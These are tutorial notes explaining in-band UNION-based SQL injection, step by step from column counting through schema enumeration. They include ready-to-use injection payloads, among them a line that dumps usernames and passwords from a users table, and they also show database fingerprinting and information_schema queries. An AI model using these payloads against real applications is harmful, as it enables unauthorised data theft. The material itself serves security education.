# In-Band UNION-Based SQL Injection

## Overview

UNION-based SQL injection is an in-band SQL injection technique that uses the `UNION` SQL operator to append the results of another `SELECT` query to the original query.

The goal is to make the application return data from other database tables.

---

## Determining the Number of Columns

Before using a `UNION` attack, we need to determine how many columns the original query returns.

One technique is using `ORDER BY`:

    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--

The number is increased until the application produces an error.

Another technique is using `UNION SELECT` with `NULL` values:

    ' UNION SELECT NULL--

    ' UNION SELECT NULL,NULL--

    ' UNION SELECT NULL,NULL,NULL--

When the correct number of columns is reached, the query executes successfully.

---

## Finding Columns Containing Useful Data

The columns returned by the `UNION` query must have compatible data types.

For example:

    ' UNION SELECT 'a',NULL,NULL--

Then:

    ' UNION SELECT NULL,'a',NULL--

And:

    ' UNION SELECT NULL,NULL,'a'--

This allows us to identify which column can display string data.

---

## Retrieving Data with UNION

Once the number of columns and useful data types are known, we can retrieve data from another table.

Example:

    ' UNION SELECT username,password FROM users--

This attempts to append the `username` and `password` values from the `users` table to the application's original query.

---

## Retrieving Multiple Values in One Column

If the application only displays one column, multiple values can sometimes be concatenated.

Example:

    username || '~' || password

This can produce output such as:

    administrator~password

The exact concatenation syntax depends on the database.

---

## Identifying the Database Type and Version

Different databases use different syntax.

### Microsoft SQL Server / MySQL

    SELECT @@version

### Oracle

    SELECT * FROM v$version

### PostgreSQL

    SELECT version()

Knowing the database type helps determine which SQL syntax and functions can be used.

---

## Oracle-Specific Syntax

Oracle requires a `FROM` clause in `SELECT` statements.

The `DUAL` table can be used:

    ' UNION SELECT NULL FROM DUAL--

---

## Enumerating Database Structure

If the table name is unknown, the `information_schema` tables can be queried on supported databases.

List tables:

    SELECT * FROM information_schema.tables

Find columns for a specific table:

    SELECT *
    FROM information_schema.columns
    WHERE table_name = 'Users'

This allows us to understand the database structure before attempting to retrieve interesting data.

---

## Practical Workflow

    1. Identify SQL injection
            ↓
    2. Determine number of columns
            ↓
    3. Identify columns that accept useful data types
            ↓
    4. Identify database type/version if necessary
            ↓
    5. Enumerate tables and columns
            ↓
    6. Use UNION SELECT to retrieve interesting data

---

## Key Takeaways

- `UNION` can combine the results of the original query with another `SELECT`.
- The `UNION` query must return the correct number of columns.
- Corresponding columns must have compatible data types.
- `ORDER BY` and `UNION SELECT NULL` can help determine the column count.
- Database-specific syntax may be required.
- `information_schema` can help enumerate tables and columns.
- Once the database structure is understood, `UNION SELECT` can be used to retrieve interesting data.